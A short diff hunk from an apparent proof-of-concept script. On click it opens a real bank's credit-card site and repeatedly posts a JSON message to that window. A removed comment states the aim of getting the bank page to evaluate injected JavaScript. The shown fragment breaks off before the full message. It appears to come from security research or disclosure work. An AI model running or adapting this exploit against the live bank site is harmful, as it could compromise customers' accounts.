@@ -56,7 +56,6 @@ onclick = () => {
   let win = open('https://d.comenity.net/ac/nflvisa/public/home');
 
   setInterval(() => {
-    // Ask the bank to eval some JS via favicon.
     win.postMessage(
       JSON.stringify({
         UUID: '1112233',
